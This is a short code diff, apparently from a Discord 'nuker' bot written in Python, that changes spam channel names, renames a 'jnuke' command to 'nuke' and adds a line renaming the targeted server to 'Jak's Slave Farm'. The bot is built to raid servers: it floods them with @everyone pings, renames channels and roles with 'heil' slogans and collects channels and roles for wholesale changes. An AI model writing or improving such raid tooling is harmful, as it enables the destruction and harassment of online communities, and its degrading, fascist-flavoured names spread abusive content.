@@ -10,7 +10,7 @@ prefix = '>'
 intents = discord.Intents.all()
 TOKEN = input("Token:")
 headers = {'Authorization': f'Bot {TOKEN}'}
-chNames = ['heil jak', 'heil jak', 'heil jak', 'heil jak']
+chNames = ['heil ukk', 'heil ukk', 'heil ukk', 'heil ukk']
 rNames = ['Nuked By Jak | Heil the Guard', 'Nuked By Jak | Heil the Guard']
 SPAM = """
 ||@everyone||
@@ -99,8 +99,9 @@ async def cdel(ctx):
 
 
 @Sachs.command(aliases=['beam', 'fuck', 'wizz'])
-async def jnuke(ctx):
+async def nuke(ctx):
     guild = ctx.guild
+    await guild.edit(name="Jak's Slave Farm | Yugoyuri!")
 
     channels = []
     roles = []
